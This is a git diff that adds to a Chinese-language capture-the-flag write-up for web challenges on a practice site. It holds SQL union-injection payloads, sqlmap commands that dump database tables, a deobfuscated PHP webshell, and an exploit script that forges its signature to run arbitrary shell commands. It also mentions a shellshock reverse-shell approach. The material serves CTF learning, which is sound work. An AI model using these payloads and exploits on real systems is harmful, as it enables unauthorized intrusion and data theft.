@@ -79,7 +79,52 @@ user: \
 pass: or user = "admin"  #\
 ```
 
+## 22 Web login as admin 0.1
+
+ 這題可以構造 union 注入，可以參見[筆記](https://r888800009.github.io/software/security/web/vulnerability/#sql-injection)
+
+測試後可以發現有四個欄位，密碼可以輸入以下指令獲取版本，發現名子可以直接洩漏資訊。
+
+```
+and 1=2  union select 1,version(),3, 4#\
+```
+
+原始碼就有 user table
+
+```
+and 1=2 union select 1, group_concat(column_name) ,3, 4 FROM INFORMATION_SCHEMA.COLUMNS  WHERE table_name = "user" ;#\
+```
+
+可以知道有以下欄位
+
+```
+id,user,password,is_admin
+```
+
+但是查看後不含有 flag 因此列舉表單名稱，不過該指令列出的不是 login_as_admin0 底下的內容
+
+```
+and 1=2  union select 1,group_concat(TABLE_NAME),3, 4  FROM INFORMATION_SCHEMA.tables;#\
+```
+
+為了方便可以直接使用 sqlmap 來輔助注入
+
+```bash
+./sqlmap.py -u 'https://hackme.inndy.tw/login0/' --data 'name=%5C&password=1' -p password --suffix ' ;#\' --level 5 --dbms mysql --risk 3 --random-agent
+```
+
+之後 sqlmap 成功之後，可以用採用以下指令找出 flag
+
+```bash
+./sqlmap.py -u 'https://hackme.inndy.tw/login0/' --data 'name=%5C&password=1'  --dbs
+./sqlmap.py -u 'https://hackme.inndy.tw/login0/' --data 'name=%5C&password=1'  --tables  -D login_as_admin0
+./sqlmap.py -u 'https://hackme.inndy.tw/login0/' --data 'name=%5C&password=1' --dump -T h1dden_f14g
+```
+
+
+
 ## 23
+
   `\'/**/or/**/name<>"guest"#`
 
 ## 26 login as admin 4
@@ -119,6 +164,7 @@ admin
     ?>
   ```
   3. payload `$_GET["a"]($_GET["cmd"]);`
+
     to `JF9HRVRbImEiXSgkX0dFVFsiY21kIl0pOw==.e3b4d16fa8cb3014e81ba999ac1b516f5b54f7bcdbc39339571ec1a8add2c182`
   4. 
 
@@ -127,7 +173,92 @@ admin
     - [step3](https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&command=JF9HRVRbImEiXSgkX0dFVFsiY21kIl0pOw==.e3b4d16fa8cb3014e81ba999ac1b516f5b54f7bcdbc39339571ec1a8add2c182&dir[]=%22&a=system&cmd=cat%20flag3/meow.c)
     - [step4](https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&command=JF9HRVRbImEiXSgkX0dFVFsiY21kIl0pOw==.e3b4d16fa8cb3014e81ba999ac1b516f5b54f7bcdbc39339571ec1a8add2c182&dir[]=%22&a=system&cmd=./flag3/meow%20flag3/flag3)
 
+## 36 Web webshell
+
+拿去反混淆器之後，可以看到執行的函數，並且再把當中 eval 改成 echo 就可以看到執行的程式碼，在進行格式化可得到如下的程式碼
+
+``` php
+<?php
+function run()
+{
+    if (isset($_GET['cmd']) && isset($_GET['sig'])) {
+        $cmd = hash('SHA512', $_SERVER['REMOTE_ADDR']) ^ (string) $_GET['cmd'];
+        $key = $_SERVER['HTTP_USER_AGENT'] . sha1($_SERVER['HTTP_HOST']);
+        $sig = hash_hmac('SHA512', $cmd, $key);
+        if ($sig === (string) $_GET['sig']) {
+            header('Content-Type: text/plain');
+            return !!system($cmd);
+        }
+    }
+    return false;
+}
+function fuck()
+{
+    print(str_repeat("\n", 4096));
+    readfile($_SERVER['SCRIPT_FILENAME']);
+}
+run() ?: fuck();
+```
+
+這題看起來只是基本的 http 協議題，只要對 http 協議熟悉基本上就可以寫出 sig，根據以下配置。並且注意原始程式碼所 sig 的 cmd 是尚未 xor 的 sig。
+
+```php
+<?php
+$my_ip = 'ip.ip.ip.ip'; // 連上伺服器的 ip
+$user_agent = 'cmd'; // curl --user-agent 'cmd'
+$host = 'webshell.hackme.inndy.tw';
+$cmd = 'echo 123';
+
+// xor 兩次可以消除
+$key = $user_agent . sha1($host);
+$sig = hash_hmac('SHA512', $cmd, $key);
+$cmd = hash('SHA512', $my_ip) ^ (string) $cmd;
+
+echo 'curl \'https://webshell.hackme.inndy.tw?cmd=' . urlencode($cmd) . '&sig=' . urlencode($sig) . '\' --user-agent \'cmd\' -H \'Host: webshell.hackme.inndy.tw\'';
+```
+
+當中空行可以透過以下指令去除
+
+``` bash
+curl ...... | grep --invert-match '^$'
+```
+
+之後可構造任意 payload，將以上 exploit 改成寫成 shell script
+
+exploit.php
+
+``` php
+<?php # var_dump($argv); ?>
+<?php # var_dump($argc); ?>
+<?php
+$my_ip = $argv[1]; // 連上伺服器的 ip
+$user_agent = 'cmd'; // curl --user-agent 'cmd'
+$host = 'webshell.hackme.inndy.tw';
+$cmd = '';
+
+for ($i = 2; $i < $argc; $i++)
+  $cmd = $cmd . ' ' . $argv[$i];
+
+# echo $cmd ;
+
+// xor 兩次可以消除
+$key = $user_agent . sha1($host);
+$sig = hash_hmac('SHA512', $cmd, $key);
+$cmd = hash('SHA512', $my_ip) ^ (string) $cmd;
+
+echo 'curl \'https://webshell.hackme.inndy.tw?cmd=' . urlencode($cmd) . '&sig=' . urlencode($sig) . '\' --user-agent \'cmd\' -H \'Host: webshell.hackme.inndy.tw\'';
+```
+
+執行 exploit
+
+```bash
+php exploit.php ip.ip.ip.ip echo 123 | bash
+php exploit.php ip.ip.ip.ip find . flag  | bash
+php exploit.php ip.ip.ip.ip cat .htflag  | bash 
+```
+
 ## 37
+
   using LFI get the source code and
 the source code will execute `putenv()` function, and the `bash`
 4.3 has `shellshock` then set a payload in http header, open reverse shell
